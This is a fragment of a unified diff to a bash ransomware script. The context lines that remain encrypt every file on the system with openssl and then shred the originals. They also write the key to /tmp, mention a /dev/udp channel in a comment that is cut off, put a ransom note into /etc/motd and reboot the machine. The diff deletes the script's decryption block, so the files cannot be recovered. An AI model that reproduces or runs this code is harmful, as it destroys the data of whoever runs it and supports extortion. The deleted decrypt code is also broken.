@@ -19,8 +19,3 @@ export key;echo "$key">/tmp/decryption.key;\        # CHANGE TO /dev/udp/127.0.0
 find / -type f 2>&1|while read -r file;do \
 openssl enc -aes256-cbc -salt -e -a -in "$file" -out "$file.sh.ka" -pass "env:key";shred -fuz "$file";done;\
 echo -e "$note" > /etc/motd;reboot -n &
-#decrypt
-echo -e "payment successful, decrypting files...";\
-key=$(cat /tmp/decryption.key); find / -type f -iname "*.sh.ka" 2>&1|while read -r file;\
-do openssl enc -aes256-cbc -d -a -in "$file" -out "$(echo "$file"|${$file//.ransom//})" -pass "env:key";
-echo -e "files decrypted.";done
